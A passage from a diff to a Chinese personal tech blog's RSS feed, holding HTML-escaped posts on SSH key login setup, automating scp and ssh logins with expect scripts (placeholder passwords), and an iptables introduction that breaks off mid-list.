#ssh服务器端口，默认为22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;User            root             #ssh服务器用户名&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;IdentityFile    ~&amp;#x2F;.ssh&amp;#x2F;id_rsa    #第一个步骤生成的公钥文件对应的私钥文件&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;更改权限&lt;/p&gt;
+&lt;figure class=&#34;highlight plain&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;chmod 600 config&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;运行，愉快登录&lt;/p&gt;
+&lt;figure class=&#34;highlight plain&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;ssh alias&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;有些服务器默认不支持密钥登陆，需要修改 &lt;code&gt;/etc/ssh/sshd_config&lt;/code&gt;  配置&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;去掉&lt;span class=&#34;comment&#34;&gt;#&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#PubkeyAuthentication yes&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;发现本机 ip&lt;/p&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;curl ifconfig.me&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">https://snowroll.github.io/shell-except/</guid>
+            <title>shell-except</title>
+            <link>https://snowroll.github.io/shell-except/</link>
+            <category>linux</category>
+            <category>shell</category>
+            <category>except</category>
+            <pubDate>Wed, 21 Oct 2020 14:57:55 +0000</pubDate>
+            <description><![CDATA[ &lt;h3 id=&#34;内容摘要&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#内容摘要&#34;&gt;#&lt;/a&gt; 内容摘要&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;except 简介&lt;/li&gt;
+&lt;li&gt;利用 except，向服务器传输文件 &amp;amp; ssh 登录服务器&lt;/li&gt;
+&lt;/ul&gt;
+&lt;a id=&#34;more&#34;&gt;&lt;/a&gt;
+&lt;h4 id=&#34;1-except简介&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1-except简介&#34;&gt;#&lt;/a&gt; 1. except 简介&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;except 的安装&lt;/p&gt;
+&lt;p&gt;Mac:&lt;/p&gt;
+&lt;figure class=&#34;highlight sh&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;brew install expect&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;Linux:&lt;/p&gt;
+&lt;figure class=&#34;highlight sh&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;apt install expect&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;压缩包安装&lt;/p&gt;
+&lt;p&gt;参考博客： &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC85NDJiODAxNzU3ZGU=&#34;&gt;https://www.jianshu.com/p/942b801757de&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;简介&lt;/p&gt;
+&lt;p&gt;shell 脚本功能非常强大，可以帮助我们自动完成很多繁琐的工作。但是对于登录服务器这种需要自动交互的过程，shell 就有些力不从心，except 可以完美解决这一需求。&lt;/p&gt;
+&lt;p&gt;参考博客： Linux expect 用法 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vMHhjYWZlZGFkZHkvcC83MTQ3MDUxLmh0bWw=&#34;&gt;https://www.cnblogs.com/0xcafedaddy/p/7147051.html&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;expect 脚本使用 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2VpbnZlcm5lLmdpdGh1Yi5pby9wb3N0LzIwMTkvMDEvZXhwZWN0LWNvbW1hbmQuaHRtbCMlRTUlODUlQjMlRTklOTQlQUUlRTUlOTElQkQlRTQlQkIlQTQ=&#34;&gt;http://einverne.github.io/post/2019/01/expect-command.html# 关键命令&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;expect - 自动交互脚本 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3hzdGFyY2QuZ2l0aHViLmlvL3dpa2kvc2hlbGwvZXhwZWN0Lmh0bWw=&#34;&gt;http://xstarcd.github.io/wiki/shell/expect.html&lt;/span&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;四个重要的命令&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;命令&lt;/th&gt;
+&lt;th&gt;说明&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;spawn&lt;/td&gt;
+&lt;td&gt;启动新的进程，输出可以被 expect 所捕获&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;expect&lt;/td&gt;
+&lt;td&gt;从进程接收字符串，期望获得字符串&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;send&lt;/td&gt;
+&lt;td&gt;向进程发送字符串，模拟用户输入，注意添加 &lt;code&gt;\r&lt;/code&gt;  回车&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;interact&lt;/td&gt;
+&lt;td&gt;允许用户与进程交互&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;简单示例  &lt;code&gt;demo.sh&lt;/code&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight sh&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#!/usr/bin/except&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;set&lt;/span&gt; timeout 10;  &lt;span class=&#34;comment&#34;&gt;# 设置程序超时时间&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;spawn ssh root@10.10.10.11  &lt;span class=&#34;comment&#34;&gt;# ssh连接服务器&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;expect &lt;span class=&#34;string&#34;&gt;&amp;quot;password&amp;quot;&lt;/span&gt;  &lt;span class=&#34;comment&#34;&gt;# 判断进程输出中是否有&amp;quot;password&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;send &lt;span class=&#34;string&#34;&gt;&amp;quot;your_password\r&amp;quot;&lt;/span&gt;  &lt;span class=&#34;comment&#34;&gt;# 将密码输入 \r是回车 &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;interact  &lt;span class=&#34;comment&#34;&gt;# 保持与服务器端的连接&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;运行方法:  &lt;code&gt;except demo.sh&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;\r \n 的区别： &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC8yMzgwNGIwYjAzYzg=&#34;&gt;https://www.jianshu.com/p/23804b0b03c8&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&#34;2-向服务器传输文件ssh登录服务器自动化脚本&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2-向服务器传输文件ssh登录服务器自动化脚本&#34;&gt;#&lt;/a&gt; 2. 向服务器传输文件 &amp;amp; ssh 登录服务器自动化脚本&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;except 与 shell 脚本结合&lt;/p&gt;
+&lt;figure class=&#34;highlight sh&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#!/bin/bash&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#!/usr/bin/expect&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 自动上传文件到服务器&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;title&#34;&gt;auto_scp&lt;/span&gt;&lt;/span&gt;()&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;comment&#34;&gt;# -c: 执行脚本前先执行的命令&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    expect -c &lt;span class=&#34;string&#34;&gt;&amp;quot;set timeout -1; &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;            spawn scp yourfile root@10.10.10.10:/target_dir/&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;            expect &amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;                \&amp;quot;yes/no\&amp;quot; &amp;#123; send \&amp;quot;yes\n\&amp;quot;; exp_continue&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;                \&amp;quot;password\&amp;quot; &amp;#123; send \&amp;quot;yourpasswd\n\&amp;quot; &amp;#125;  # \n 和 \r 均可以&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;            interact&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;            &amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# ssh登录服务器&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;title&#34;&gt;auto_ssh_restart&lt;/span&gt;&lt;/span&gt;() &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    expect -c &lt;span class=&#34;string&#34;&gt;&amp;quot;set timeout -1;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;            spawn ssh root@10.10.10.10&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;            expect \&amp;quot;password\&amp;quot; &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;            send \&amp;quot;yourpassword\r\&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;            expect \&amp;quot;]#\&amp;quot; &amp;#123; send \&amp;quot;pwd\n\&amp;quot; &amp;#125; &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;            interact&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;auto_scp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;auto_ssh_restart&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;center&gt;点绛唇·途中逢管倅
+&lt;center&gt; 憔悴天涯，故人相遇情如故。别离何遽，忍唱阳关句！&lt;/center&gt;
+&lt;center&gt;我是行人，更送行人去。愁无据。寒蝉鸣处，回首斜阳暮。&lt;/center&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">https://snowroll.github.io/iptables/</guid>
+            <title>iptables 简介</title>
+            <link>https://snowroll.github.io/iptables/</link>
+            <category>linux</category>
+            <pubDate>Thu, 08 Oct 2020 12:00:00 +0000</pubDate>
+            <description><![CDATA[ &lt;h3 id=&#34;内容摘要&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#内容摘要&#34;&gt;#&lt;/a&gt; 内容摘要&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;iptables 相关概念介绍&lt;/li&gt;
+&lt;li&gt;iptables 相关命令&lt;/li&gt;
+&lt;li&gt;常用命令解析&lt;/li&gt;
+&lt;/ul&gt;
+&lt;a id=&#34;more&#34;&gt;&lt;/a&gt;
+&lt;h3 id=&#34;一-iptables相关概念介绍&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#一-iptables相关概念介绍&#34;&gt;#&lt;/a&gt; 一、 iptables 相关概念介绍&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;参考的博客链接 https://aimuke.github.io/linux/2019/05/28/iptables/&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;功能简介&lt;/p&gt;
+&lt;p&gt;根据管理员定义的规则 &lt;code&gt;rules&lt;/code&gt;  对数据包进行过滤，在 &lt;code&gt;rules&lt;/code&gt;  中可以指定数据包的 &lt;code&gt;源地址&lt;/code&gt; 、 &lt;code&gt;目标地址&lt;/code&gt; 、 &lt;code&gt;协议类型&lt;/code&gt; 等，过滤操作包括 &lt;code&gt;ACCEPT&lt;/code&gt; 、 &lt;code&gt;REJECT&lt;/code&gt; 、 &lt;code&gt;DROP&lt;/code&gt;  和 &lt;code&gt;LOG&lt;/code&gt;  等等。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Chain&lt;/p&gt;
+&lt;p&gt;针对数据包的不同流向，又设置了不同的关卡，术语为 &lt;code&gt;Chain(链)&lt;/code&gt; 。当数据包的目标主机为本机时使用 &lt;code&gt;INPUT&lt;/code&gt; ，需要经过本机转发给其他服务器使用 &lt;code&gt;FORWORD&lt;/code&gt; ，本机数据包发送出去使用 &lt;code&gt;OUTPUT&lt;/code&gt; 。还有 &lt;code&gt;PREROUTING&lt;/code&gt;  和 &lt;code&gt;POSTROUTING&lt;/code&gt; ，下面这张图能够很好地说明几个链所处的位置，图片来源见水印&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;http://www.zsythink.net/wp-content/uploads/2017/02/021217_0051_2.png&#34; alt=&#34;a&#34;&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;table&lt;/p&gt;
+&lt;p&gt;不同的规则会对数据包进行不同的操作，相同功能的规则会构成一个 &lt;code&gt;table(表)&lt;/code&gt; ， &lt;code&gt;iptables&lt;/code&gt;  提供的表如下所示&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;表名&lt;/th&gt;
+&lt;th&gt;功能&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;filter&lt;/td&gt;
+&lt;td&gt;过滤，防火墙  内核模块： iptables_filter&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;nat&lt;/td&gt;
+&lt;td&gt;网络地址转换 内核模块： iptable_nat&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;mangle&lt;/td&gt;
+&lt;td&gt;拆解报文，做出修改，并重新封装 内核模块： iptable_mangle&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;raw&lt;/td&gt;
+&lt;td&gt;关闭 nat 表上启用的连接追踪功能 内核模块： iptable_raw&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Chain 和 table&lt;/p&gt;
+&lt;p&gt;不同的链中包含不同的表，不同的表执行有优先级，具体可见下图（来源见水印）&lt;/p&gt;
+&lt;img data-src=&#34;http://www.zsythink.net/wp-content/uploads/2017/02/021217_0051_6.png&#34; alt=&#34;aa&#34; style=&#34;zoom:%;&#34; /&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;二-相关命令&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#二-相关命令&#34;&gt;#&lt;/a&gt; 二、 相关命令&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;基本命令&lt;/p&gt;
+&lt;figure class=&#34;highlight sh&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sudo iptables -L&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;列出目前 &lt;code&gt;iptables&lt;/code&gt;  中的规则，对于新建立的服务器，没有任何规则，结果如下&lt;/p&gt;
+&lt;figure class=&#34;highlight sh&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Chain INPUT (policy ACCEPT)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;target     prot opt &lt;span class=&#34;built_in&#34;&gt;source&lt;/span&gt;               destination&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Chain FORWARD (policy ACCEPT)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;target     prot opt &lt;span class=&#34;built_in&#34;&gt;source&lt;/span&gt;               destination&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Chain OUTPUT (policy ACCEPT)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;target     prot opt &lt;span class=&#34;built_in&#34;&gt;source&lt;/span&gt;               destination&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;命令参数&lt;/p&gt;
+&lt;figure class=&#34;highlight plain&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1. -A  添加规则到规则链&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2. -L  列出当前的过滤规则&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3. -m  conntrack 运行过滤规则根据连接状态进行匹配&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4. -p  连接的目标协议&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5. --dport  规则的目标端口&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6. -j 跳转的特定的目标，iptables一般允许4个目标&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    - ACCEPT 接收数据包并停止本链规则匹配&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    - REJECT 拒绝数据包并提醒发送者，停止规则继续匹配&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    - DROP 静默扔掉数据包，停止规则继续匹配&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    - LOG 记录数据包，继续运行本链中更多的规则&lt;/span&gt;&lt;br&gt;&lt;span 